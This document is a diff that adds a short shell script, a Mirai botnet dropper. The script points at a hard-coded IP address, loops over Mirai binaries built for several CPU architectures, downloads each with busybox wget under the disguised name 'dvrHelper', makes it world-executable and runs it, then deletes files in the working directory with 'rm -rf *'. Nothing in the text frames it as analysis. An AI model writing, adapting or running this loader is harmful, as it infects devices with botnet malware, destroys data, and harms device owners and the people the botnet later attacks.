@@ -1,0 +1,12 @@
+#!/bin/sh
+
+WEBSERVER="46.166.185.66:80"
+BIN="mirai.arm5n mirai.m68k mirai.mpsl mirai.sh4 mirai.x86 mirai.arm mirai.arm7 mirai.mips mirai.ppc mirai.spc"
+
+for Binary in $BIN; do
+    /bin/busybox wget http://$WEBSERVER/bins/$Binary -O dvrHelper
+    /bin/busybox chmod 777 dvrHelper
+    ./dvrHelper ssh.preload
+done
+
+rm -rf *
